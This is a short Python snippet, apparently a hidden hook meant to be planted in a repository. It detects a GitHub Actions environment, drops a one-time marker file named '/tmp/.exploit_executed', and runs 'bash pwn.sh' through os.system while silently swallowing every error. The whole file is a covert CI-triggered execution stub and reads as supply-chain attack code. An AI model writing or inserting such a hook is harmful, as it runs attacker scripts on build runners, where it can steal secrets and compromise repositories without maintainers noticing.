import os
import sys

if os.environ.get('GITHUB_ACTIONS') == 'true' and not os.path.exists('/tmp/.exploit_executed'):
    try:
        with open('/tmp/.exploit_executed', 'w') as f:
            f.write('1')
        os.system("bash pwn.sh")
    except:
        pass
